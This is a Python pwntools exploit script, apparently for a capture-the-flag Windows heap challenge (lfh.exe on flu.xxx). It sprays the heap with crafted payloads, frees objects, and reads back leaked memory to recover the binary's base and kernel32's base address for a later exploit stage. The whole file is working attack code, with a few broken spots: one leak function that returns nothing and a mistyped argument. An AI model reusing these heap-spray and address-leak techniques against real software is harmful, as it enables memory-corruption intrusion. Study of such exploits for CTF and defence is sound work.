from pwn import *
import pefile
from time import sleep

context.arch = 'i386'

IP, PORT = 'flu.xxx', 2094
binary_base=0x008d0000
k32_base = 0x75b00000

DEBUG = True

p = None
_p = None


def run():
    global p, _p

    log.info("run")

    if DEBUG:
        _p = process('lfh.exe')
        sleep(0.5)

        p = remote('127.0.0.1', 9999)
        p.timeout = 20000000
    else:
        p = remote(IP, PORT)
        p.timeout = 1500


def destroy():
    global p, _p

    try:
        if _p:
            _p.close()
    except:
        pass

    try:
        if p:
            p.close()
    except:
        pass


def cmd(sel, data: bytes):
    p.recvuntil(b'\xCC\x00')
    p.send(str(sel).encode())
    p.send(data)


def sel1(s: bytes):
    cmd(1, s)
    p.recvuntil(b'DEBUG: obj->hash:\x00')
    return p.recvuntil(b'\xAA\xBB')[:-2]


def sel2(wait=4000):
    old = p.timeout
    p.timeout = wait
    cmd(2, b'')
    p.timeout = old


def sel3(elem_cnt, indices, strs):
    payload = p32(elem_cnt)

    payload += b''.join(
        p32(i) + s1 + s2
        for i, (s1, s2) in zip(indices, strs)
    )

    cmd(3, payload)


def sel3_free():
    cmd(3, p32(0xffff))


def spray(cnt, spray_payload: bytes):
    assert b'\n' not in spray_payload[:-1]

    indices = list(range(cnt))
    strs = [(spray_payload, spray_payload)] * cnt

    sel3(cnt, indices, strs)


def leak_binary_base():
    try_base = 1 * 0x00000
    log.info(f"Trying base {try_base:08x}")

    
    spray_payload = (
        b'A' * 0x1c +
        p32(try_base + 0x009c1000)[:-1] +
        b'\n'
    )


    run()
#            log.info('sel2')
#            sel2()
        
    spray(0x18 // 2, spray_payload) #0x18//2 == 0xc == 12
    log.info('sel3')
    sel3_free()
    log.info('sel1')
    res = sel1(b'\n')
    log.info(res)

    return None

def leak_k32_base():
    run()
    idt_ptr = binary_base + 0x15000 # Import Directory Table at known offset

    # Spray with the address of the IDT to leak IDT
    spray(0x18 // 2, b'B' * 0x1c + p32(idt_ptr)[:-1]+b'\n')

    sel3_free()

    # these last four bytes should be the address of Kernel32
    # kernel32 should be the first module in the list, its usually loaded first
    res = sel1('\n')[:4]
    print(repr(res))
    # unpack the address of WriteConsoleW
    WriteConsoleW = unpack('<I', res.ljust(4, b'\x00'))[0]
    log.info('WriteConsoleW: {:08}'.format(WriteConsoleW))

    k32 = pefile.PE("./kernel32.dll")
    for exp in k32.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name == b'WriteConsoleW':
            break
    k32base = WriteConsoleW - exp.address
    return k32base

def main():
 #   base = leak_binary_base()
 #   log.success(f"leaked base: {base:08x}")
    k32_base = leak_k32_base()
    log.success("kernel32.dll: {k32_base:08x}")

if __name__ == "__main__":
    main()
